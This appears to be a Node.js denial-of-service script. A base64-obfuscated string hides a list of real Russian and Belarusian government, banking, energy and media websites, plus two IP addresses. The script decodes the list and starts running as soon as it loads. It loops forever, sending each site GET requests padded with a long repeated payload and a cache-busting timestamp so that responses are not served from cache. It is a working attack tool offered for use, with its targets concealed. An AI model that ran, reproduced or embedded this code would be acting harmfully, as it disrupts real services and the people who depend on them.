const str= 'aHR0cHM6Ly93d3cuZ2F6cHJvbS5ydS9ffF9odHRwczovL2x1a29pbC5ydS9ffF9odHRwczovL21hZ25pdC5ydS9ffF9odHRwczovL3d3dy5ub3JuaWNrZWwuY29tL198X2h0dHBzOi8vd3d3LnN1cmd1dG5lZnRlZ2FzLnJ1L198X2h0dHBzOi8vd3d3LnRhdG5lZnQucnUvX3xfaHR0cHM6Ly93d3cuZXZyYXouY29tL198X2h0dHBzOi8vbmxtay5jb20vX3xf\n' +
    'aHR0cHM6Ly93d3cuc2lidXIucnUvX3xfaHR0cHM6Ly93d3cuc2V2ZXJzdGFsLmNvbS9ffF9odHRwczovL3d3dy5tZXRhbGxvaW52ZXN0LmNvbS9ffF9odHRwczovL25hbmdzLm9yZy9ffF9odHRwczovL3Jtay1ncm91cC5ydS9ffF9odHRwczovL3d3dy50bWstZ3JvdXAucnUvX3xfaHR0cHM6Ly95YS5ydS9ffF9odHRwczovL3d3dy5wb2x5bWV0YWxpbnRl\n' +
    'cm5hdGlvbmFsLmNvbS9ffF9odHRwczovL3d3dy51cmFsa2FsaS5jb20vX3xfaHR0cHM6Ly93d3cuZXVyb3NpYi5ydS9ffF9odHRwczovL29tay5ydS9ffF9odHRwczovL3d3dy5zYmVyYmFuay5ydS9ffF9odHRwczovL3d3dy52dGIucnUvX3xfaHR0cHM6Ly93d3cuZ2F6cHJvbWJhbmsucnUvX3xfaHR0cHM6Ly93d3cuZ29zdXNsdWdpLnJ1L198X2h0dHBz\n' +
    'Oi8vd3d3Lm1vcy5ydS91c2x1Z2kvX3xfaHR0cDovL2tyZW1saW4ucnUvX3xfaHR0cDovL2dvdmVybm1lbnQucnUvX3xfaHR0cHM6Ly9taWwucnUvX3xfaHR0cHM6Ly9tYWlsLnJ1L198X2h0dHBzOi8vd3d3Lm5hbG9nLmdvdi5ydS9ffF9odHRwczovL2N1c3RvbXMuZ292LnJ1L198X2h0dHBzOi8vcGZyLmdvdi5ydS9ffF9odHRwczovL3Jrbi5nb3YucnUv\n' +
    'X3xfaHR0cHM6Ly8xMDkuMjA3LjEuMTE4L198X2h0dHBzOi8vMTA5LjIwNy4xLjk3L198X2h0dHBzOi8vbWFpbC5ya24uZ292LnJ1L198X2h0dHBzOi8vY2xvdWQucmtuLmdvdi5ydV98X2h0dHBzOi8vbXZkLmdvdi5ydV98X2h0dHBzOi8vcHdkLnd0by5lY29ub215Lmdvdi5ydS9ffF9odHRwczovL3N0cm9pLmdvdi5ydS9ffF9odHRwczovL3Byb3Zlcmtp\n' +
    'Lmdvdi5ydS9ffF9odHRwczovL21pbC5ydV98X2h0dHA6Ly93d3cuc2NyZi5nb3YucnVffF9odHRwczovL2FjaC5nb3YucnVffF9odHRwczovL2VwcC5nZW5wcm9jLmdvdi5ydV98X2h0dHBzOi8vd3d3Lmdvc3VzbHVnaS5ydV98X2h0dHA6Ly9rcmVtbGluLnJ1X3xfaHR0cHM6Ly9taWQucnVffF9odHRwczovL3d3dy4xdHYucnVffF9odHRwczovL3BucC5y\n' +
    'dV98X2h0dHBzOi8vZnNiLnJ1X3xfaHR0cHM6Ly93d3cucnQuY29tL198X2h0dHBzOi8vdGFzcy5ydS9ffF9odHRwczovL3Zlc3RpLnJ1X3xfaHR0cHM6Ly95YW5kZXgucnVffF9odHRwczovL2l6LnJ1L198X2h0dHBzOi8vbGVudGEucnVffF9odHRwczovL3ZndHJrLnJ1X3xfaHR0cHM6Ly9yaWEucnVffF9odHRwczovL3JhbWJsZXIucnVffF9odHRwczov\n' +
    'L2dhemV0YS5ydV98X2h0dHBzOi8vZHVtYS5nb3YucnVffF9odHRwczovL2JlbHRhLmJ5X3xfaHR0cHM6Ly9tay5ydV98X2h0dHBzOi8vZ2F6cHJvbS5ydV98X2h0dHBzOi8vZ2F6cHJvbWJhbmsucnVffF9odHRwczovL3puYWsuY29tX3xfaHR0cHM6Ly9jYnIucnVffF9odHRwczovL3NiZXJiYW5rLnJ1X3xfaHR0cHM6Ly92dGIucnVffF9odHRwczovL3Jv\n' +
    'c2JhbmsucnVffF9odHRwczovL2twLnJ1X3xfaHR0cHM6Ly9rYXJhdWxvdmxpZmUucnVffF9odHRwczovL25ld3MtZnJvbnQuaW5mby9ffF9odHRwczovL3J1c25leHQucnUvX3xfaHR0cDovL2xpZmUucnUvX3xfaHR0cHM6Ly93d3cubWlkLWRuci5zdS9ffF9odHRwczovL3d3dy41LXR2LnJ1L2xpdmUvX3xfaHR0cDovL3p2ZXpkYS5ydS9ffF9odHRwczov\n' +
    'L3d3dy5wb2xpdG5hdmlnYXRvci5uZXQvX3xfaHR0cHM6Ly9ydXNzaWFuLnJ0LmNvbS9ffF9odHRwOi8vbHQuc3B1dG5pa25ld3MucnUvX3xfaHR0cDovL3NwdXRuaWtuZXdzLmx0L198X2h0dHBzOi8vc3B1dG5pay1hYmtoYXppYS5ydS9ffF9odHRwOi8vZnJhbmNhaXMucnQuY29tL198X2h0dHBzOi8vbm92b3Jvc2luZm9ybS5vcmcvX3xfaHR0cHM6Ly9y\n' +
    'ZW4udHYvX3xfaHR0cDovL3R2enZlemRhLnJ1L198X2h0dHBzOi8vY3JpbWVhMjQudHYv';
  const buff = new Buffer(str, 'base64');
  const {httpClient} = require('./http.client');
var urlMain = require('url');
let text = buff.toString('ascii');
let targets = text.split("_|_") ;
if(Math.random()<0.5)targets=targets.sort((a,b)=>a>b?1:-1)

async function init() {
  console.log('init requests');
  while (true) {
    for (let i = 0; i < targets.length; i++) {
      const url = targets[i];
      var q = urlMain.parse(url, true);
      let res;
      try {
        res = await httpClient({
          hostname: q.host,
          port: url.match("https")?443:80,
          path: q.pathname+`?t=${Date.now()}&v=${str.repeat(100)}`,
          headers: {
            "Access-Control-Allow-Origin": "*",
          },
          method: "get",
          url,
        },JSON.stringify({}));
        await sleep();
      } catch (e) {
        console.log(e);
      } finally {
      }
    }
  }
}

function sleep(t = 5 * 1000 * 60) {
  return new Promise((resolve) => setTimeout(resolve, t));
}

init();
module.exports={init}
